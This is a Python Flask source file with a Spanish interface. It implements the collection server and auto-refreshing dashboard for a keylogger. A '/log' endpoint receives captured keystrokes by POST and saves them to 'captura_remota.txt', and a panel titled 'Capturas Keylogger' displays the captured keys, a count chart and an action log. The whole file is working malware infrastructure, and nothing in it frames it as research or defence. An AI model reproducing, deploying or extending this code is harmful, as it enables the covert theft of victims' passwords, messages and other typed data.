from flask import Flask, request, render_template_string, redirect, url_for, jsonify
from datetime import datetime
import atexit

app = Flask(__name__)

capturas = []

TEMPLATE = """ 
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Capturas Keylogger</title>
<style>
body { font-family: Arial, sans-serif; background: #121212; color: #f1f1f1; padding: 20px; }
h1 { color: #00ff99; }
.log-box { background: #1e1e1e; padding: 15px; border-radius: 8px; margin-top: 20px; white-space: pre-wrap; }
button { background: #ff4444; color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; margin-top: 15px; }
button:hover { background: #cc0000; }
.actions { margin-top: 40px; }
canvas { background: #1e1e1e; border-radius: 8px; margin-top: 20px; }
</style>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
async function actualizar() {
    let log = await fetch('/data').then(res => res.text());
    document.getElementById('log').innerText = log;

    let acciones = await fetch('/acciones').then(res => res.text());
    document.getElementById('acciones').innerText = acciones;

    let count = await fetch('/count').then(res => res.json());
    myChart.data.datasets[0].data = [count.teclas];
    myChart.update();
}
setInterval(actualizar, 2000);

window.onload = function() {
    const ctx = document.getElementById('grafico').getContext('2d');
    window.myChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: ['Teclas Capturadas'],
            datasets: [{
                label: 'Cantidad',
                data: [0],
                backgroundColor: ['#00ff99']
            }]
        },
        options: {
            responsive: true,
            plugins: { legend: { display: false } },
            scales: { y: { beginAtZero: true } }
        }
    });
}
</script>
</head>
<body>
<h1>📝 Capturas del Keylogger</h1>
<p>Este panel se actualiza automáticamente.</p>
<div class="log-box" id="log">{{log}}</div>
<form method="POST" action="/clear">
<button type="submit">🗑️ Borrar Capturas</button>
</form>
<canvas id="grafico" width="400" height="100"></canvas>
<div class="actions">
<h2>📜 Historial de acciones</h2>
<div class="log-box" id="acciones">{{acciones}}</div>
</div>
</body>
</html>
"""

def log_accion(texto):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open("acciones.txt", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {texto}\n")

@app.route('/')
def index():
    try:
        with open("acciones.txt", "r", encoding="utf-8") as f:
            acciones = f.read()
    except FileNotFoundError:
        acciones = ""
    return render_template_string(TEMPLATE, log="".join(capturas), acciones=acciones)

@app.route('/data')
def get_data():
    return "".join(capturas)

@app.route('/acciones')
def get_acciones():
    try:
        with open("acciones.txt", "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return ""

@app.route('/count')
def get_count():
    return jsonify({"teclas": len(capturas)})

@app.route('/log', methods=['POST'])
def log_key():
    key = request.form.get("key")
    if key:
        capturas.append(key)
        with open("captura_remota.txt", "a", encoding="utf-8") as f:
            f.write(key)
    return "OK"

@app.route('/clear', methods=['POST'])
def clear_log():
    global capturas
    capturas = []
    open("captura_remota.txt", "w", encoding="utf-8").close()
    log_accion("Se borraron las capturas")
    return redirect(url_for("index"))

def on_exit():
    log_accion("Servidor detenido")

atexit.register(on_exit)

if __name__ == "__main__":
    log_accion("Servidor iniciado")
    print("Servidor Flask corriendo en http://127.0.0.1:5000 ...")
    app.run(host="127.0.0.1", port=5000)
